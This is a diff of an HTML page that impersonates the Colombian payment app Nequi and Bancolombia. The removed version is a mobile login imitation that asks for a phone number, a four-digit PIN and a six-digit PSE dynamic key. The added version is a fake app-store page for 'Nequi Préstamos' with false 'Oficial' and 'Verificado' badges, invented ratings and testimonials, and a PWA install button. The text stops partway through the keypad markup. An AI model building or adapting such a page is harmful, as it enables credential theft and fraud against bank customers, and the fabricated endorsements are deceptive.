@@ -1,752 +1,442 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="es" class="h-full bg-white">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Nequi - Pagos PSE</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi Préstamos - Tienda de Aplicaciones</title>
+    
+    <!-- PWA Web App Manifest -->
+    <link rel="manifest" href='data:application/manifest+json,{"name":"Nequi Préstamos","short_name":"Nequi Préstamos","description":"Solicita tu préstamo rápido y sin papeleo con Nequi Colombia.","start_url":".","display":"standalone","background_color":"#ffffff","theme_color":"#200020","icons":[{"src":"https://i.ibb.co/mrDtP2DW/405b3bfe-ec9b-4c85-b17f-76de3ef2345b-1.png","sizes":"192x192","type":"image/png"}]}'>
+    <meta name="theme-color" content="#200020">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="Nequi Préstamos">
+
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Lucide Icons CDN -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <!-- Font Family Inter -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        nequi: {
+                            main: '#200020',
+                            purple: '#4a004e',
+                            pink: '#e20074',
+                            lightPink: '#ff3399',
+                            bg: '#f8f4f9',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            -webkit-font-smoothing: antialiased;
+        /* Hide scrollbars for gallery */
+        .hide-scrollbar::-webkit-scrollbar {
+            display: none;
         }
-
-        body {
-            background-color: #17001a;
-            color: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-
-        .mobile-frame {
-            width: 100%;
-            height: 100vh;
-            background-color: #17001a;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            padding: 20px;
-            position: relative;
-        }
-
-        .screen {
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            height: 100%;
-            width: 100%;
-        }
-
-        .hidden {
-            display: none !important;
-        }
-
-        /* --- Pantalla 1 --- */
-        .header-top {
-            display: flex;
-            justify-content: flex-end;
-            align-items: center;
-        }
-
-        .help-btn {
-            background: transparent;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            color: white;
-            padding: 6px 16px;
-            border-radius: 20px;
-            cursor: pointer;
-            font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .logo-area {
-            flex-grow: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .logo-container {
-            position: relative;
-        }
-
-        .logo-text {
-            font-size: 72px;
-            font-weight: 900;
-            letter-spacing: -3px;
-            color: #ffffff;
-            line-height: 1;
-        }
-
-        .pink-square {
-            width: 12px;
-            height: 12px;
-            background-color: #ff007f;
-            position: absolute;
-            left: -18px;
-            top: 18px;
-        }
-
-        .bottom-section {
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
-        }
-
-        .input-section {
-            margin-bottom: 20px;
-        }
-
-        .input-box-wrapper {
-            background-color: #2b1130;
-            border: 1px solid #ff007f;
-            border-radius: 8px;
-            padding: 14px 16px;
-            display: flex;
-            align-items: center;
-            font-size: 18px;
-        }
-
-        .prefix {
-            color: rgba(255, 255, 255, 0.6);
-            margin-right: 12px;
-        }
-
-        .phone-input {
-            background: transparent;
-            border: none;
-            color: #ffffff;
-            font-size: 18px;
-            width: 100%;
-            outline: none;
-        }
-
-        .phone-input::placeholder {
-            color: rgba(255, 255, 255, 0.4);
-        }
-
-        .error-message {
-            color: #ff3355;
-            font-size: 13px;
-            margin-top: 8px;
-        }
-
-        .action-container {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 24px;
-        }
-
-        .btn-enter {
-            flex-grow: 1;
-            background-color: #a50055;
-            color: rgba(255, 255, 255, 0.4);
-            border: none;
-            padding: 16px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: not-allowed;
-            transition: 0.2s;
-        }
-
-        .btn-enter.active {
-            background-color: #c6005e;
-            color: #ffffff;
-            cursor: pointer;
-        }
-
-        .btn-qr {
-            background-color: #c6005e;
-            color: #ffffff;
-            border: none;
-            width: 52px;
-            border-radius: 8px;
-            font-size: 22px;
-            font-weight: bold;
-            cursor: pointer;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .footer-links {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            font-size: 14px;
-            color: rgba(255, 255, 255, 0.8);
-            margin-bottom: 10px;
-        }
-
-        .change-phone-container {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .phone-icon-svg {
-            width: 14px;
-            height: 18px;
-            border: 1.5px solid rgba(255, 255, 255, 0.8);
-            border-radius: 3px;
-        }
-
-        .change-phone {
-            text-decoration: none;
-            color: #ffffff;
-        }
-
-        .brand-by {
-            font-size: 12px;
-            color: rgba(255, 255, 255, 0.5);
-            display: flex;
-            align-items: center;
-            gap: 4px;
-        }
-
-        .bbva-bars {
-            font-weight: bold;
-            letter-spacing: -2px;
-            font-size: 13px;
-        }
-
-        /* --- Pantalla 2 (Clave) --- */
-        .pin-header {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            font-size: 20px;
-            font-weight: 500;
-            margin-bottom: 24px;
-        }
-
-        .back-btn {
-            background: none;
-            border: none;
-            color: white;
-            font-size: 24px;
-            cursor: pointer;
-        }
-
-        .pin-dots-container {
-            display: flex;
-            justify-content: center;
-            gap: 16px;
-            margin-bottom: 20px;
-        }
-
-        .pin-dot {
-            width: 45px;
-            height: 45px;
-            background-color: #ece4f0;
-            border-radius: 8px;
-        }
-
-        .pin-dot.filled {
-            background-color: #270c2e;
-            border: 2px solid #ff007f;
-        }
-
-        .pin-subtitle {
-            text-align: center;
-            color: #d1c4e9;
-            font-size: 14px;
-            line-height: 1.4;
-            margin-bottom: 40px;
-        }
-
-        .keypad {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 16px;
-            padding: 0 10px;
-            text-align: center;
-            margin-bottom: 20px;
-        }
-
-        .key {
-            background: none;
-            border: none;
-            color: white;
-            font-size: 32px;
-            font-weight: 400;
-            cursor: pointer;
-            padding: 10px 0;
-        }
-
-        .key:active {
-            opacity: 0.5;
-        }
-
-        .forgot-pin-container {
-            text-align: center;
-        }
-
-        .btn-forgot {
-            background: transparent;
-            border: 1px solid rgba(255, 255, 255, 0.3);
-            color: white;
-            padding: 10px 24px;
-            border-radius: 8px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-
-        /* --- Pantalla 3 (Clave Dinámica PSE - Fondo Blanco Estilo Imagen) --- */
-        .pse-screen {
-            background-color: #ffffff;
-            color: #17001a;
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100vh;
-            padding: 30px 20px;
-            display: flex;
-            flex-direction: column;
-            justify-content: space-between;
-            z-index: 20;
-        }
-
-        .pse-top-content {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            text-align: center;
-        }
-
-        .pse-logo-container {
-            position: relative;
-            margin-bottom: 20px;
-        }
-
-        .pse-logo-text {
-            font-size: 40px;
-            font-weight: 900;
-            letter-spacing: -2px;
-            color: #17001a;
-            line-height: 1;
-        }
-
-        .pse-pink-square {
-            width: 8px;
-            height: 8px;
-            background-color: #ff007f;
-            position: absolute;
-            left: -12px;
-            top: 10px;
-        }
-
-        .pse-title {
-            font-size: 24px;
-            font-weight: bold;
-            color: #17001a;
-            margin-bottom: 24px;
-        }
-
-        .pse-subtitle {
-            font-size: 14px;
-            color: #4a4052;
-            line-height: 1.5;
-            max-width: 320px;
-            margin-bottom: 30px;
-        }
-
-        .pse-input-row {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            width: 100%;
-            margin-bottom: 20px;
-        }
-
-        .pse-badge-six {
-            background-color: #e60073;
-            color: white;
-            font-size: 22px;
-            font-weight: bold;
-            width: 42px;
-            height: 42px;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .pse-lines-container {
-            display: flex;
-            gap: 12px;
-        }
-
-        .pse-line-box {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            width: 28px;
-        }
-
-        .pse-dash {
-            width: 100%;
-            border-bottom: 2px solid #a89ba8;
-            margin-bottom: 6px;
-        }
-
-        .pse-digit {
-            font-size: 22px;
-            font-weight: bold;
-            color: #17001a;
-            height: 30px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .pse-keypad {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
-            width: 100%;
-            max-width: 320px;
-            margin: 0 auto;
-            text-align: center;
-        }
-
-        .pse-key {
-            background: none;
-            border: none;
-            color: #17001a;
-            font-size: 28px;
-            font-weight: 400;
-            cursor: pointer;
-            padding: 12px 0;
-        }
-
-        .pse-key:active {
-            opacity: 0.5;
-        }
-
-        .pse-key-del {
-            background-color: #17001a;
-            color: white;
-            border-radius: 8px;
-            font-size: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            width: 48px;
-            height: 48px;
-            margin: auto;
-            cursor: pointer;
+        .hide-scrollbar {
+            -ms-overflow-style: none;
+            scrollbar-width: none;
         }
     </style>
 </head>
-<body>
+<body class="font-sans antialiased text-slate-800 bg-white min-h-full flex flex-col selection:bg-nequi-pink selection:text-white">
 
-    <div class="mobile-frame">
-        
-        <!-- ================= PANTALLA 1 ================= -->
-        <div class="screen" id="screen1">
-            <div class="header-top">
-                <button class="help-btn">
-                    <span>?</span> Ayuda
+    <!-- Header Navigation -->
+    <header class="sticky top-0 z-30 bg-white/80 backdrop-blur-md border-b border-slate-100 shadow-sm">
+        <div class="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
+            <div class="flex items-center gap-3">
+                <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-nequi-purple to-nequi-pink flex items-center justify-center text-white shadow-md shadow-nequi-pink/20 font-bold text-xl">
+                    N
+                </div>
+            </div>
+            
+            <div class="flex items-center gap-4">
+                <button class="p-2 text-slate-500 hover:text-slate-700 hover:bg-slate-100 rounded-full transition-colors" title="Buscar">
+                    <i data-lucide="search" class="w-5 h-5"></i>
+                </button>
+                <button class="p-2 text-slate-500 hover:text-slate-700 hover:bg-slate-100 rounded-full transition-colors" title="Compartir">
+                    <i data-lucide="share-2" class="w-5 h-5"></i>
                 </button>
             </div>
+        </div>
+    </header>
 
-            <div class="logo-area">
-                <div class="logo-container">
-                    <div class="pink-square"></div>
-                    <h1 class="logo-text">Neqᴜı</h1>
+    <!-- Main Content Container -->
+    <main class="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 py-6 flex-1 w-full space-y-8">
+
+        <!-- App Hero Section -->
+        <section class="bg-white rounded-3xl p-6 sm:p-8 shadow-sm border border-slate-100">
+            <div class="flex flex-col md:flex-row items-start md:items-center gap-6">
+                <!-- App Icon -->
+                <div class="relative group">
+                    <div class="w-28 h-28 sm:w-32 sm:h-32 rounded-3xl bg-slate-900 flex items-center justify-center overflow-hidden shadow-xl shadow-nequi-purple/20 border-2 border-white/20 transform transition-transform group-hover:scale-105">
+                        <img src="https://i.ibb.co/mrDtP2DW/405b3bfe-ec9b-4c85-b17f-76de3ef2345b-1.png" alt="Nequi Préstamos Logo" class="w-full h-full object-cover">
+                    </div>
+                    <div class="absolute -bottom-2 -right-2 bg-emerald-500 text-white rounded-full p-1.5 shadow-md border-2 border-white" title="Aplicación Verificada">
+                        <i data-lucide="shield-check" class="w-4 h-4"></i>
+                    </div>
+                </div>
+
+                <!-- App Core Metadata -->
+                <div class="flex-1 space-y-2">
+                    <div class="flex items-center gap-2">
+                        <span class="text-xs font-bold uppercase tracking-wider text-nequi-pink bg-nequi-pink/10 px-2.5 py-1 rounded-md">Oficial</span>
+                        <span class="text-xs text-slate-500 flex items-center gap-1"><i data-lucide="check-circle-2" class="w-3.5 h-3.5 text-emerald-500"></i> Verificado por Protect</span>
+                    </div>
+                    
+                    <h1 class="text-2xl sm:text-3xl font-extrabold text-slate-900 tracking-tight">Nequi Préstamos</h1>
+                    <p class="text-sm font-medium text-nequi-purple hover:underline cursor-pointer">Nequi Colombia / Bancolombia</p>
+                    
+                    <div class="flex flex-wrap items-center gap-y-2 gap-x-6 pt-2 text-sm text-slate-600">
+                        <div class="flex items-center gap-1">
+                            <span class="font-bold text-slate-900">4.9</span>
+                            <div class="flex text-amber-400">
+                                <i data-lucide="star" class="w-4 h-4 fill-current"></i>
+                            </div>
+                            <span class="text-xs text-slate-400">(210k reseñas)</span>
+                        </div>
+                        <div class="h-4 w-px bg-slate-200"></div>
+                        <div class="flex items-center gap-1">
+                            <i data-lucide="download-cloud" class="w-4 h-4 text-slate-400"></i>
+                            <span class="font-bold text-slate-900">+10 Millones</span>
+                            <span class="text-xs text-slate-400">descargas</span>
+                        </div>
+                        <div class="h-4 w-px bg-slate-200 hidden sm:block"></div>
+                        <div class="flex items-center gap-1">
+                            <span class="px-2 py-0.5 text-xs font-semibold bg-slate-100 text-slate-700 rounded">Finanzas</span>
+                            <span class="px-2 py-0.5 text-xs font-semibold bg-slate-100 text-slate-700 rounded">Préstamos & Créditos</span>
+                        </div>
+                    </div>
                 </div>
             </div>
 
-            <div class="bottom-section">
-                <section class="input-section">
-                    <div class="input-box-wrapper">
-                        <span class="prefix">+57</span>
-                        <input type="tel" class="phone-input" id="phoneInput" placeholder="Ingresa tu cel" maxlength="10" oninput="validatePhone(this)">
+            <!-- Direct Install Action -->
+            <div class="mt-8 pt-6 border-t border-slate-100 flex flex-col sm:flex-row items-center gap-4">
+                <div class="w-full sm:w-auto sm:min-w-[280px]">
+                    <button id="installBtn" onclick="handlePwaInstall()" class="w-full relative overflow-hidden bg-emerald-600 hover:bg-emerald-700 text-white font-semibold py-3.5 px-8 rounded-2xl shadow-lg shadow-emerald-600/25 hover:shadow-xl hover:shadow-emerald-600/35 transition-all duration-300 flex items-center justify-center gap-3 active:scale-[0.98]">
+                        <i data-lucide="download" class="w-5 h-5 relative z-10"></i>
+                        <span id="btnText" class="relative z-10 text-base font-bold">Instalar</span>
+                    </button>
+                </div>
+
+                <div class="flex items-center gap-2 text-xs text-slate-500">
+                    <i data-lucide="shield-check" class="w-4 h-4 text-emerald-500"></i>
+                    <span>Descarga PWA directa y segura. Sin cobros sorpresa.</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- Highlights / Ventajas del préstamo -->
+        <section class="bg-gradient-to-r from-nequi-bg to-white rounded-3xl p-6 sm:p-8 shadow-sm border border-nequi-pink/15 space-y-3">
+            <div class="flex items-center justify-between">
+                <h2 class="text-lg font-bold text-slate-900 flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-5 h-5 text-nequi-pink"></i> ¿Por qué elegir Nequi Préstamos?
+                </h2>
+                <span class="text-xs font-semibold text-nequi-purple bg-nequi-purple/10 px-2.5 py-1 rounded-full">Desembolso Inmediato</span>
+            </div>
+            <ul class="text-sm text-slate-600 space-y-2 pt-1 list-disc list-inside">
+                <li><strong class="text-slate-800">Cero papeleo:</strong> Solicita tu crédito en menos de 3 minutos solo con tu cédula.</li>
+                <li><strong class="text-slate-800">Aprobación al instante:</strong> Respuesta inmediata sin filas ni trámites físicos.</li>
+                <li><strong class="text-slate-800">Plazos flexibles:</strong> Elige pagar en cómodas cuotas ajustadas a tu bolsillo.</li>
+                <li><strong class="text-slate-800">Depósito directo:</strong> Tu plata queda disponible de inmediato en tu cuenta Nequi.</li>
+            </ul>
+        </section>
+
+        <!-- Screenshots Carousel / Gallery (Exact 3 Screenshots) -->
+        <section class="space-y-4">
+            <div class="flex items-center justify-between">
+                <h2 class="text-lg font-bold text-slate-900 flex items-center gap-2">
+                    <i data-lucide="smartphone" class="w-5 h-5 text-nequi-pink"></i> Previsualización de la app
+                </h2>
+                <div class="flex gap-2">
+                    <button onclick="scrollGallery('left')" class="p-2 rounded-full border border-slate-200 hover:bg-slate-100 text-slate-600">
+                        <i data-lucide="chevron-left" class="w-4 h-4"></i>
+                    </button>
+                    <button onclick="scrollGallery('right')" class="p-2 rounded-full border border-slate-200 hover:bg-slate-100 text-slate-600">
+                        <i data-lucide="chevron-right" class="w-4 h-4"></i>
+                    </button>
+                </div>
+            </div>
+
+            <div id="galleryContainer" class="flex gap-4 overflow-x-auto hide-scrollbar pb-2 scroll-smooth">
+                <!-- Captura 1 -->
+                <div class="flex-none w-60 sm:w-64 h-[440px] bg-slate-900 rounded-3xl overflow-hidden shadow-md border border-slate-200 relative group">
+                    <img src="https://i.pinimg.com/736x/fe/e9/0c/fee90c35b772321d69683197befd2d08.jpg" alt="Previsualización 1 - Nequi Préstamos" class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-300">
+                    <div class="absolute bottom-3 left-3 right-3 bg-slate-950/70 backdrop-blur-md rounded-xl p-2.5 text-center text-xs font-semibold text-white border border-white/10">
+                        Captura 1
                     </div>
-                    <p class="error-message" id="errorMsg">Escribe porfa el número de tu cel para seguir.</p>
+                </div>
+
+                <!-- Captura 2 -->
+                <div class="flex-none w-60 sm:w-64 h-[440px] bg-slate-900 rounded-3xl overflow-hidden shadow-md border border-slate-200 relative group">
+                    <img src="https://i.pinimg.com/736x/97/ea/2e/97ea2e78b0fd314896b9d58e1133e15c.jpg" alt="Previsualización 2 - Nequi Préstamos" class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-300">
+                    <div class="absolute bottom-3 left-3 right-3 bg-slate-950/70 backdrop-blur-md rounded-xl p-2.5 text-center text-xs font-semibold text-white border border-white/10">
+                        Captura 2
+                    </div>
+                </div>
+
+                <!-- Captura 3 -->
+                <div class="flex-none w-60 sm:w-64 h-[440px] bg-slate-900 rounded-3xl overflow-hidden shadow-md border border-slate-200 relative group">
+                    <img src="https://i.pinimg.com/736x/00/f9/33/00f93394c2e6c95c1818a03d3f40aaec.jpg" alt="Previsualización 3 - Nequi Préstamos" class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-300">
+                    <div class="absolute bottom-3 left-3 right-3 bg-slate-950/70 backdrop-blur-md rounded-xl p-2.5 text-center text-xs font-semibold text-white border border-white/10">
+                        Captura 3
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- App Details & Features -->
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+            <div class="lg:col-span-2 space-y-8">
+                <!-- Description -->
+                <section class="bg-white rounded-3xl p-6 sm:p-8 shadow-sm border border-slate-100 space-y-4">
+                    <h2 class="text-xl font-bold text-slate-900">Acerca de Nequi Préstamos</h2>
+                    <p class="text-slate-600 leading-relaxed text-sm sm:text-base">
+                        <strong>Nequi Préstamos</strong> es la solución financiera diseñada por Nequi Colombia y Bancolombia para brindarte créditos rápidos, transparentes y 100% digitales. Olvídate de los trámites largos y los formularios interminables: pide tu préstamo desde el celular y recibe el dinero desembolsado de inmediato en tu cuenta.
+                    </p>
+
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 pt-4">
+                        <div class="p-4 rounded-2xl bg-nequi-bg border border-nequi-pink/10 flex items-start gap-3">
+                            <div class="p-2.5 bg-nequi-pink/10 text-nequi-pink rounded-xl">
+                                <i data-lucide="zap" class="w-5 h-5"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-semibold text-slate-900 text-sm">Desembolso Inmediato</h3>
+                                <p class="text-xs text-slate-500 mt-0.5">Una vez aprobado, el dinero se transfiere directamente a tu disponible.</p>
+                            </div>
+                        </div>
+
+                        <div class="p-4 rounded-2xl bg-nequi-bg border border-nequi-pink/10 flex items-start gap-3">
+                            <div class="p-2.5 bg-nequi-pink/10 text-nequi-pink rounded-xl">
+                                <i data-lucide="file-text" class="w-5 h-5"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-semibold text-slate-900 text-sm">Sin Papeleo ni Codeudor</h3>
+                                <p class="text-xs text-slate-500 mt-0.5">Todo el proceso se realiza de manera 100% digital desde tu smartphone.</p>
+                            </div>
+                        </div>
+
+                        <div class="p-4 rounded-2xl bg-nequi-bg border border-nequi-pink/10 flex items-start gap-3">
+                            <div class="p-2.5 bg-nequi-pink/10 text-nequi-pink rounded-xl">
+                                <i data-lucide="sliders" class="w-5 h-5"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-semibold text-slate-900 text-sm">Cuotas Transparentes</h3>
+                                <p class="text-xs text-slate-500 mt-0.5">Conoce exactamente cuánto pagarás antes de confirmar la solicitud.</p>
+                            </div>
+                        </div>
+
+                        <div class="p-4 rounded-2xl bg-nequi-bg border border-nequi-pink/10 flex items-start gap-3">
+                            <div class="p-2.5 bg-nequi-pink/10 text-nequi-pink rounded-xl">
+                                <i data-lucide="lock" class="w-5 h-5"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-semibold text-slate-900 text-sm">Respaldo Bancolombia</h3>
+                                <p class="text-xs text-slate-500 mt-0.5">Seguridad y cifrado bancario de la entidad líder en Colombia.</p>
+                            </div>
+                        </div>
+                    </div>
                 </section>
 
-                <div class="action-container">
-                    <button class="btn-enter" id="enterBtn" disabled onclick="goToPinScreen()">Entra</button>
-                    <button class="btn-qr">$</button>
-                </div>
+                <!-- Reviews and Ratings Section -->
+                <section class="bg-white rounded-3xl p-6 sm:p-8 shadow-sm border border-slate-100 space-y-6">
+                    <h2 class="text-xl font-bold text-slate-900">Calificaciones y opiniones</h2>
 
-                <footer class="footer-links">
-                    <div class="change-phone-container">
-                        <div class="phone-icon-svg"></div>
-                        <a href="#" class="change-phone">¿Cambiaste tu cel?</a>
-                    </div>
-                    <div class="brand-by">by <span class="bbva-bars">≡</span></div>
-                </footer>
-            </div>
-        </div>
-
-        <!-- ================= PANTALLA 2 (Clave) ================= -->
-        <div class="screen hidden" id="screen2">
-            <div>
-                <div class="pin-header">
-                    <button class="back-btn" onclick="goToScreen1()">←</button>
-                    <span>Escribe tu clave</span>
-                </div>
-                
-                <div class="pin-dots-container">
-                    <div class="pin-dot" id="dot0"></div>
-                    <div class="pin-dot" id="dot1"></div>
-                    <div class="pin-dot" id="dot2"></div>
-                    <div class="pin-dot" id="dot3"></div>
-                </div>
-
-                <div class="pin-subtitle">
-                    No dudamos que seas tú...<br>Pero es mejor confirmar ;)
-                </div>
-            </div>
-
-            <div>
-                <div class="keypad">
-                    <button class="key" onclick="pressKey('1')">1</button>
-                    <button class="key" onclick="pressKey('2')">2</button>
-                    <button class="key" onclick="pressKey('3')">3</button>
-                    <button class="key" onclick="pressKey('4')">4</button>
-                    <button class="key" onclick="pressKey('5')">5</button>
-                    <button class="key" onclick="pressKey('6')">6</button>
-                    <button class="key" onclick="pressKey('7')">7</button>
-                    <button class="key" onclick="pressKey('8')">8</button>
-                    <button class="key" onclick="pressKey('9')">9</button>
-                    <button class="key" style="visibility: hidden;"></button>
-                    <button class="key" onclick="pressKey('0')">0</button>
-                    <button class="key" onclick="pressKey('del')">⌫</button>
-                </div>
-
-                <div class="forgot-pin-container">
-                    <button class="btn-forgot">Olvidé mi clave</button>
-                </div>
-            </div>
-        </div>
-
-        <!-- ================= PANTALLA 3 (Pagos PSE Clave Dinámica) ================= -->
-        <div class="pse-screen hidden" id="screen3">
-            <div class="pse-top-content">
-                <div class="pse-logo-container">
-                    <div class="pse-pink-square"></div>
-                    <h1 class="pse-logo-text">Neqᴜı</h1>
-                </div>
-
-                <h2 class="pse-title">Prestamos PSE de Nequi</h2>
-                
-                <p class="pse-subtitle">
-                    Para confirmar tu pago escribe o pega la clave dinámica que encuentras en tu App Nequi.
-                </p>
-
-                <div class="pse-input-row">
-                    <div class="pse-badge-six">6</div>
-                    <div class="pse-lines-container">
-                        <div class="pse-line-box">
-                            <div class="pse-digit" id="d0"></div>
-                            <div class="pse-dash"></div>
+                    <div class="grid grid-cols-1 sm:grid-cols-3 gap-6 items-center bg-slate-50 p-6 rounded-2xl border border-slate-100">
+                        <div class="text-center sm:border-r border-slate-200 pr-0 sm:pr-6">
+                            <div class="text-5xl font-extrabold text-slate-900">4.9</div>
+                            <div class="flex justify-center text-amber-400 my-2">
+                                <i data-lucide="star" class="w-5 h-5 fill-current"></i>
+                                <i data-lucide="star" class="w-5 h-5 fill-current"></i>
+                                <i data-lucide="star" class="w-5 h-5 fill-current"></i>
+                                <i data-lucide="star" class="w-5 h-5 fill-current"></i>
+                                <i data-lucide="star" class="w-5 h-5 fill-current"></i>
+                            </div>
+                            <span class="text-xs text-slate-500">210,320 valoraciones</span>
                         </div>
-                        <div class="pse-line-box">
-                            <div class="pse-digit" id="d1"></div>
-                            <div class="pse-dash"></div>
-                        </div>
-                        <div class="pse-line-box">
-                            <div class="pse-digit" id="d2"></div>
-                            <div class="pse-dash"></div>
-                        </div>
-                        <div class="pse-line-box">
-                            <div class="pse-digit" id="d3"></div>
-                            <div class="pse-dash"></div>
-                        </div>
-                        <div class="pse-line-box">
-                            <div class="pse-digit" id="d4"></div>
-                            <div class="pse-dash"></div>
-                        </div>
-                        <div class="pse-line-box">
-                            <div class="pse-digit" id="d5"></div>
-                            <div class="pse-dash"></div>
+
+                        <div class="sm:col-span-2 space-y-2 text-xs">
+                            <div class="flex items-center gap-3">
+                                <span class="w-3 text-slate-600 font-medium">5</span>
+                                <div class="flex-1 h-2 bg-slate-200 rounded-full overflow-hidden">
+                                    <div class="h-full bg-amber-400 rounded-full w-[90%]"></div>
+                                </div>
+                            </div>
+                            <div class="flex items-center gap-3">
+                                <span class="w-3 text-slate-600 font-medium">4</span>
+                                <div class="flex-1 h-2 bg-slate-200 rounded-full overflow-hidden">
+                                    <div class="h-full bg-amber-400 rounded-full w-[7%]"></div>
+                                </div>
+                            </div>
+                            <div class="flex items-center gap-3">
+                                <span class="w-3 text-slate-600 font-medium">3</span>
+                                <div class="flex-1 h-2 bg-slate-200 rounded-full overflow-hidden">
+                                    <div class="h-full bg-amber-400 rounded-full w-[2%]"></div>
+                                </div>
+                            </div>
+                            <div class="flex items-center gap-3">
+                                <span class="w-3 text-slate-600 font-medium">2</span>
+                                <div class="flex-1 h-2 bg-slate-200 rounded-full overflow-hidden">
+                                    <div class="h-full bg-amber-400 rounded-full w-[0.5%]"></div>
+                                </div>
+                            </div>
+                            <div class="flex items-center gap-3">
+                                <span class="w-3 text-slate-600 font-medium">1</span>
+                                <div class="flex-1 h-2 bg-slate-200 rounded-full overflow-hidden">
+                                    <div class="h-full bg-amber-400 rounded-full w-[0.5%]"></div>
+                                </div>
+                            </div>
                         </div>
                     </div>
-                </div>
+
+                    <div class="space-y-4 divide-y divide-slate-100">
+                        <div class="pt-4 space-y-2">
+                            <div class="flex items-center justify-between">
+                                <div class="flex items-center gap-2">
+                                    <div class="w-8 h-8 rounded-full bg-nequi-purple text-white font-bold flex items-center justify-center text-xs">
+                                        JP
+                                    </div>
+                                    <span class="text-sm font-semibold text-slate-900">Juan Pablo Torres</span>
+                                </div>
+                                <span class="text-xs text-slate-400">Ayer</span>
+                            </div>
+                            <div class="flex text-amber-400">
+                                <i data-lucide="star" class="w-3.5 h-3.5 fill-current"></i>
+                                <i data-lucide="star" class="w-3.5 h-3.5 fill-current"></i>
+                                <i data-lucide="star" class="w-3.5 h-3.5 fill-current"></i>
+                                <i data-lucide="star" class="w-3.5 h-3.5 fill-current"></i>
+                                <i data-lucide="star" class="w-3.5 h-3.5 fill-current"></i>
+                            </div>
+                            <p class="text-xs sm:text-sm text-slate-600">
+                                Me salvó de una emergencia. Solicité $500.000 y en menos de dos minutos ya los tenía reflejados en mi saldo. Súper recomendado.
+                            </p>
+                        </div>
+
+                        <div class="pt-4 space-y-2">
+                            <div class="flex items-center justify-between">
+                                <div class="flex items-center gap-2">
+                                    <div class="w-8 h-8 rounded-full bg-nequi-pink text-white font-bold flex items-center justify-center text-xs">
+                                        LV
+                                    </div>
+                                    <span class="text-sm font-semibold text-slate-900">Laura Valencia</span>
+                                </div>
+                                <span class="text-xs text-slate-400">Hace 3 días</span>
+                            </div>
+                            <div class="flex text-amber-400">
+                                <i data-lucide="star" class="w-3.5 h-3.5 fill-current"></i>
+                                <i data-lucide="star" class="w-3.5 h-3.5 fill-current"></i>
+                                <i data-lucide="star" class="w-3.5 h-3.5 fill-current"></i>
+                                <i data-lucide="star" class="w-3.5 h-3.5 fill-current"></i>
+                                <i data-lucide="star" class="w-3.5 h-3.5 fill-current"></i>
+                            </div>
+                            <p class="text-xs sm:text-sm text-slate-600">
+                                Muy claro todo. Muestra las cuotas fijas exactas antes de desembolsar y puedes abonar a capital cuando quieras.
+                            </p>
+                        </div>
+                    </div>
+                </section>
             </div>
 
-            <div>
-                <div class="pse-keypad">
-                    <button class="pse-key" onclick="pressPseKey('1')">1</button>
-                    <button class="pse-key" onclick="pressPseKey('2')">2</button>
-                    <button class="pse-key" onclick="pressPseKey('3')">3</button>
-                    <button class="pse-key" onclick="pressPseKey('4')">4</button>
-                    <button class="pse-key" onclick="pressPseKey('5')">5</button>
-                    <button class="pse-key" onclick="pressPseKey('6')">6</button>
-                    <button class="pse-key" onclick="pressPseKey('7')">7</button>
